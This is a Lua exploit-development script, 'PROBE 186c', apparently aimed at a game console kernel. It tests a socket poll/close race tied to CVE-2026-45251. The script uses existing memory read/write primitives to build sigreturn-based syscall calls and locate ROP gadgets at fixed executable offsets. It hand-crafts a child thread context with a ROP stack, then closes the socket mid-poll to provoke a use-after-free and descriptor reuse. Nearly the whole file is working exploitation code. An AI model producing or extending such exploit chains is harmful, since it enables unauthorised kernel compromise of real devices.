-- CRASH_CLASS: MODERATE
-- PROBE 186c: Socket poll/close race (CVE-2026-45251 test)
--
-- Child thread polls socket with 10s timeout.
-- Main thread closes socket while child blocks in poll.
-- Tests if seldrain is properly called on socket close.

print("=== 186c: SOCKET POLL/CLOSE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sc_addr)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local _, gpu = pcall(function()
    return make_syscall(477)(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- Eboot + gadgets (offsets from 185g)
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108)
local eb_hi = rd(info + 0x10C)
local mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + 0x92C67))
local jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + 0x15481))
local pop_rdi = uint64(string.format("0x%X%08X", eb_hi, eb_lo + 0xC9DFE))

-- Nanosleep
local TS = 0x70000
local function nsleep(ms)
    wq(gpu + TS, uint64(0))
    wq(gpu + TS + 8, uint64(ms * 1000000))
    srop(240, ga(TS), uint64(0))
end

-- Create TCP socket
local rv = srop(97, uint64(2), uint64(1), uint64(0))
local sock = rv and to_num(rv) or -1
print("sock=" .. sock)
if sock < 0 then print("NO SOCKET") return end

-- Baseline poll: 0ms timeout
local PFD = 0x10000
wd(gpu + PFD, sock)
wd(gpu + PFD + 4, 0x0001)  -- POLLIN
rv = srop(209, ga(PFD), uint64(1), uint64(0))
print("poll(0ms)=" .. (rv and to_num(rv) or -999))

-- Child pollfd
local CPFD = 0x11000
wd(gpu + CPFD, sock)
wd(gpu + CPFD + 4, 0x0001)

-- Child marker
local CMARK = 0x12000
wq(gpu + CMARK, uint64(0xDEADDEAD))

-- Child stack: after poll returns:
-- ret -> pop_rdi; ret -> marker_addr -> mov [rdi],rax;ret -> jmp $
local ST = 0x20000 - 32
wq(gpu + ST, pop_rdi)
wq(gpu + ST + 8, ga(CMARK))
wq(gpu + ST + 16, mov_g)
wq(gpu + ST + 24, jmp_g)

-- Child thread context: poll(pollfd, 1, 5000)
local TC = 0x30000
for i = 0, 0x4FF, 8 do wq(gpu + TC + i, uint64(0)) end
wq(gpu + TC + 0x108, uint64(0x480))
wd(gpu + TC + 0x0D0, 0)
wq(gpu + TC + 0x110, uint64(0x10000))
wd(gpu + TC + 0x0C0, 0x43)
wd(gpu + TC + 0x100, 0x3B)
wq(gpu + TC + 0x0E0, sc_addr)
wq(gpu + TC + 0x0F8, ga(ST))
wq(gpu + TC + 0x048, ga(CPFD))      -- RDI = pollfd
wq(gpu + TC + 0x050, uint64(1))     -- RSI = nfds
wq(gpu + TC + 0x058, uint64(5000))  -- RDX = 5s timeout
wq(gpu + TC + 0x078, uint64(209))   -- RAX = poll

local tb = memory.alloc(8)
wd(tb, 0)
print("")
print("--- CREATING POLL CHILD ---")
rv = srop(430, ga(TC), uint64(tb))
local cr = rv and to_num(rv) or -999
local ct = rd(tb)
print("create=" .. cr .. " tid=0x" .. string.format("%X", ct))

-- Wait 300ms for child to enter poll
nsleep(300)

rv = srop(431, uint64(ct), uint64(0))
print("child_alive=" .. (rv and to_num(rv) or -999))

-- CLOSE THE SOCKET
print("CLOSING sock=" .. sock)
rv = srop(6, uint64(sock))
print("close=" .. (rv and to_num(rv) or -999))

-- Wait 500ms for poll to wake
nsleep(500)

-- Check results
rv = srop(431, uint64(ct), uint64(0))
local alive = rv and to_num(rv) or -999
print("child_alive_after=" .. alive)

local cm = rq(gpu + CMARK)
print("marker=" .. hex64(cm) .. " (" .. to_num(cm) .. ")")

local crev = rd(gpu + CPFD + 4)
print("revents=0x" .. string.format("%X", crev % 0x10000))

if alive ~= 0 then
    print("!!! CHILD DIED — POSSIBLE UAF CRASH !!!")
end
if to_num(cm) ~= 0xDEADDEAD then
    print("poll returned: " .. to_num(cm))
end

-- FD REUSE: open new socket, see if it reuses the number
print("")
print("--- FD REUSE ---")
rv = srop(97, uint64(2), uint64(2), uint64(17))
local new_fd = rv and to_num(rv) or -1
print("new_fd=" .. new_fd .. " (old=" .. sock .. ")")
if new_fd == sock then
    print("!!! FD REUSED !!!")
end

-- Wait for child poll to timeout/wake
nsleep(1000)
rv = srop(431, uint64(ct), uint64(0))
print("child_final=" .. (rv and to_num(rv) or -999))
local cm2 = rq(gpu + CMARK)
print("marker_final=" .. hex64(cm2))

if new_fd >= 0 then srop(6, uint64(new_fd)) end

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
